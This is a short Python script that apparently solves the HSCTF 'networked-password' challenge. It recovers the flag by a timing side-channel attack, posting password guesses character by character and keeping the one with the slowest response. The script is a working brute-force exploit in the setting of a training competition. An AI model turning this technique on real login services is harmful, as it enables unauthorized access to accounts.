import requests
import string
import sys
host = "https://networked-password.web.chal.hsctf.com/"

charset =string.letters + string.digits + "{}_"
r = requests.get(host)

#print r.text

flag = "hsctf{"

while flag[-1:]!= "}":
    charlist = []
    timelist = []
    for char in charset:
        postdata = {"password" : flag + char}
        r = requests.post(host, data=postdata)
        print flag + char
        print r.elapsed.total_seconds()
        charlist.append(char)
        timelist.append(r.elapsed.total_seconds())
        # if r.elapsed.total_seconds() > 4:
        #      flag += char
        #      print flag
        #      sys.exit()
    maxtime = max(timelist)
    ind = timelist.index(maxtime)
    flag += charlist[ind]

print "FLAG: " + flag
